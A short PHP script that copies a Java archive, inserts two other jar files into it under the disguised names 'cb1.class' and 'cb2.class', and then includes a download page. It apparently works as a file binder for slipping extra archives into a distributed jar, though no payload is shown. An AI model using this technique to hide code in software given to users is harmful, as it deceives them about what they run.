<?php

	copy('source.jar', 'Binded.jar');

$zip = new ZipArchive;
if ($zip->open('Binded.jar') === TRUE) {
    $zip->addFile('1.jar', 'cb1.class');
	$zip->addFile('2.jar', 'cb2.class');
    $zip->close();
	include('download.php');
} else {
    echo 'failed';
}


?>